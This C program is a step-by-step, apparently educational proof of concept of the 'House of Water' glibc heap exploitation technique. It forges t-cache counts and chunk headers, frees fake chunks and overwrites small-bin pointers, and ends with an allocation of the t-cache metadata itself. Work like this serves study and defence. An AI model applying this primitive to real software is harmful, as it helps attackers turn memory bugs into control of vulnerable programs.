#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>

/* 
 * House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache 
 * metadata control primitive, with the added benefit of obtaining a free libc pointer in the 
 * t-cache metadata as well.
 *
 * NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will
 * contain 4 bits of randomness. If you can increment integers, no brutefore is required.
 *
 * By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a "fake" heap chunk header of 
 * size "0x10001" is created.
 * 
 * This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked 
 * address entries, enabling the creation of a fully functional fake small-bin entry.
 * 
 * The correct size should be set for the chunk, and the next chunk's prev-in-use bit 
 * must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values 
 * should be written.
 *
 * Finally, due to the behavior of allocations from small-bins, once t-cache metadata control
 * is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer
 * to be ready for allocation as well.
 *
 * Technique / house by @udp_ctf - Water Paddler / Blue Water 
 */

void dump_memory(void *addr, unsigned long count) {
	for (unsigned int i = 0; i < count*16; i += 16) {
		printf("0x%016lx\t\t0x%016lx  0x%016lx\n", (unsigned long)(addr+i), *(long *)(addr+i), *(long *)(addr+i+0x8));
	}	
}

int main(void) {
	// Dummy variable
	void *_ = NULL;

	// Prevent _IO_FILE from buffering in the heap
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 1           |");
	puts("\t==============================");
	puts("\n");

	// Step 1: Allocate a 0x3d8 and a 0x3e8 to set their respective t-cache counts to 1, 
	// effectively inserting 0x10001 in to the t-cache above the 0x20 and 0x30 t-cache
	// addresses.
	puts("Allocate and free a chunk in 0x3e0 and 0x3f0 t-caches. This sets both");
	puts("their t-cache entry counts to 1 and creates a fake 0x10001 header:");

	void *fake_size_lsb = malloc(0x3d8);
	void *fake_size_msb = malloc(0x3e8);
	puts("\t- chunks:");
	printf("\t\t* Entry 0x3e0 @ %p\n", fake_size_lsb);
	printf("\t\t* Entry 0x3f0 @ %p\n", fake_size_msb);
	free(fake_size_lsb);
	free(fake_size_msb);
	puts("");
	
	// This is just to make a pointer to the t-cache metadata for later.
	void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));

	puts("The t-cache metadata will now have the following entry counts:");
	dump_memory(metadata+0x70, 3);
	puts("");

	// Make allocations to free later such that we can exhaust the 0x90 t-cache
	puts("Allocate 7 0x88 chunks needed to fill out the 0x90 t-cache at a later time");
	void *x[7];
	for (int i = 0; i < 7; i++) {
		x[i] = malloc(0x88);
	}
	puts("");
	
	
	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 2           |");
	puts("\t==============================");
	puts("\n");

	// Step 2: Create the small bins linked list, used for hijacking at a later time
	puts("Now, allocate three 0x90 chunks with guard chunks in between. This prevents");
	puts("chunk-consolidation and sets our target for the house of water attack.");
	puts("\t- chunks:");
	
	void *small_start = malloc(0x88);
	printf("\t\t* small_start\t@ %p\n", small_start);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");

	void *small_middle = malloc(0x88);
	printf("\t\t* small_middle\t@ %p\n", small_middle);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");
	
	void *small_end = malloc(0x88);
	printf("\t\t* small_end\t\t@ %p\n", small_end);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");
	
	puts("");

	
	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 3           |");
	puts("\t==============================");
	puts("\n");

	// Step 3: Satisfy the conditions for a free'd chunk, namely having the correct size at the end of the chunk and
	// a size field next to it having it's prev-in-use bit set to 0
	puts("Make an allocation to reach the end of the faked chunk");
	
	_ = malloc(0xf000);		  // Padding
	void *end_of_fake = malloc(0x18); // Metadata chunk
	
	puts("\t- chunks:");
	printf("\t\t* padding\t\t@ %p\n", _);
	printf("\t\t* end of fake\t\t@ %p\n", end_of_fake);
	puts("");

	puts("Write the correct metadata to the chunk to prevent libc from failing checks:");
	printf("\t*%p = 0x10000\n", end_of_fake);
	*(long *)end_of_fake = 0x10000;
	printf("\t*%p = 0x20\n", end_of_fake+8);
	*(long *)(end_of_fake+0x8) = 0x20;
	puts("");

	puts("Creating the following setup:");
	puts("");
	dump_memory(end_of_fake, 1);
	puts("");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 4           |");
	puts("\t==============================");
	puts("\n");

	// Step 4: Free t-cache entries
	puts("Fill up the 0x90 t-cache with the chunks allocated from earlier by freeing them.");	
	puts("By doing so, the next time a 0x88 chunk is free'd, it ends up in the small-bin");
	puts("instead of the t-cache.");
	for (int i = 0; i < 7; i++) {
		free(x[i]);
	}
	puts("\n");

	
	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 5           |");
	puts("\t==============================");
	puts("\n");
	
	// Step 5: Create a 0x20 and a 0x30 t-cache entry which overlaps small_start and small_end.
	// By doing this, we can blindly fake a FWD and BCK pointer in the t-cache metadata!
		
	puts("Here comes the trickiest part!\n");
	
	puts("We essentially want a pointer in the 0x20 t-cache metadata to act as a FWD\n"
	"pointer and a pointer in the 0x30 t-cache to act as a BCK pointer.");
	puts("We want it such that it points to the chunk header of our small bin entries,\n"
	"and not at the chunk itself which is common for t-cache.\n");
	
	puts("Using a technique like house of botcake or a stronger arb-free primitive, free a");
	puts("chunk such that it overlaps with the header of small_start and small_end.");
	puts("");

	puts("It should look like the following:");
	puts("");
	
	puts("small_start:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x30][0/1], small[all][0]\n", (unsigned long)(small_start-0x10), *(long *)(small_start-0x10), *(long *)(small_start-0x8));
	dump_memory(small_start, 2);
	puts("");

	puts("small_end:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x20][0/1], smallbin[all][2]\n", (unsigned long)(small_end-0x10), *(long *)(small_end-0x10), *(long *)(small_end-0x8));
	dump_memory(small_end, 2);

	puts("\n");
	puts("If you want to see a blind example using only double free, see the following chal: ");
	puts("https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki");
	puts("\n");

	puts("For the sake of simplicity, let's just simulate an arbitrary free primitive.");
	puts("\n");
	
	
	puts("--------------------");
	puts("|      PART 1      |");
	puts("--------------------");
	puts("\n");

	// Step 5 part 1:
	puts("Write 0x31 above small_start to enable its freeing into the 0x30 t-cache.");
	printf("\t*%p-0x18 = 0x31\n", small_start);
	*(long*)(small_start-0x18) = 0x31;
	puts("");

	puts("This creates a 0x31 entry just above small_start, which looks like the following:");
	dump_memory(small_start-0x20, 3);
	puts("");

	printf("Free the faked 0x31 chunk @ %p\n", small_start-0x10);
	free(small_start-0x10); // Create a fake FWD
	puts("");
	
	puts("Finally, because of the meta-data created by free'ing the 0x31 chunk, we need to");
	puts("restore the original header of the small_start chunk by restoring the 0x91 header:");
	printf("\t*%p-0x8 = 0x91\n", small_start);
	*(long*)(small_start-0x8) = 0x91;
	puts("");

	puts("Now, let's do the same for small_end except using a 0x21 faked chunk.");
	puts("");


	puts("--------------------");
	puts("|      PART 2      |");
	puts("--------------------");
	puts("\n");

	// Step 5 part 2:
	puts("Write 0x21 above small_end, such that it can be free'd in to the 0x20 t-cache:");
	printf("\t*%p-0x18 = 0x21\n", small_end);
	*(long*)(small_end-0x18) = 0x21;
	puts("");
	
	puts("This creates a 0x21 just above small_end, which looks like the following:");
	dump_memory(small_end-0x20, 3);
	puts("");
	
	printf("Free the faked 0x21 chunk @ %p\n", small_end-0x10);
	free(small_end-0x10); // Create a fake BCK
	puts("");
	
	puts("restore the original header of the small_end chunk by restoring the 0x91 header:");
	printf("\t*%p-0x8 = 0x91\n", small_end);
	*(long*)(small_end-0x8) = 0x91;
	puts("");

	
	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 6           |");
	puts("\t==============================");
	puts("\n");

	// Step 6: Create the small bin list
	puts("Now, let's free the small bin entries!");
	
	puts("\t> free(small_end);");
	free(small_end);
	
	puts("\t> free(small_middle);");
	free(small_middle);
	
	puts("\t> free(small_start);");
	free(small_start);
	
	puts("\n");

	// Show the setup as is	
	
	puts("At this point, our heap looks something like this:");
	
	printf("\t- Small bin:\n");
	puts("\t\tsmall_start <--> small_middle <--> small_end");
	printf("\t\t%p <--> %p <--> %p\n", small_start-0x10, small_middle-0x10, small_end-0x10);
	
	printf("\t- 0x20 t-cache:\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x90));
	printf("\t- 0x30 t-cache\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x98));
	puts("");

	puts("The fake chunk in the t-cache will look like the following:");
	dump_memory(metadata+0x70, 4);
	puts("");

	puts("We can now observe that the 0x30 t-cache points to small_start and 0x20 t-cache points to ");
	puts("small_end, which is what we need to fake an small-bin entry and hijack small_middle.");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 7           |");
	puts("\t==============================");
	puts("\n");

	// Step 7: Overwrite LSB of small_start and small_end to point to the fake t-cache metadata chunk
	puts("Finally, all there is left to do is simply overwrite the LSB of small_start FWD-");
	puts("and BCK pointer for small_end to point to the faked t-cache metadata chunk.");
	puts("");
	
	/* VULNERABILITY */
	printf("\t- small_start:\n");
	printf("\t\t*%p = %p\n", small_start, metadata+0x80);
	*(unsigned long *)small_start = (unsigned long)(metadata+0x80);
	puts("");

	printf("\t- small_end:\n");
	printf("\t\t*%p = %p\n", small_end, metadata+0x80); 
	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata+0x80);
	puts("");
	/* VULNERABILITY */

	puts("At this point, the small bin will look like the following:");
	puts("");

	puts("\t- small bin:");
	printf("\t\t small_start <--> metadata chunk <--> small_end\n");
	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x80, small_end);


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 8           |");
	puts("\t==============================");
	puts("\n");

	// Step 8: allocate to win
	puts("Now, we can get the metadata chunk by doing 10 allocations:");
	puts("\t7 for tcachebins");
	puts("\t1 for small_start, which triggers the reverse refilling logic (moving chunks from smallbin to tcache)");
	puts("\t1 for small_end, it is out first because revere refilling reverses the linked list");
	puts("\tand the last one is our tcache metadata chunk");

	for(int i=0; i<9; i++) malloc(0x88);
	
	// Next allocation *could* be our faked chunk!
	void *meta_chunk = malloc(0x88);

	printf("\t\tNew chunk\t @ %p\n", meta_chunk);
	printf("\t\tt-cache metadata @ %p\n", metadata);
	assert(meta_chunk == (metadata+0x90)); 
	puts("");
}
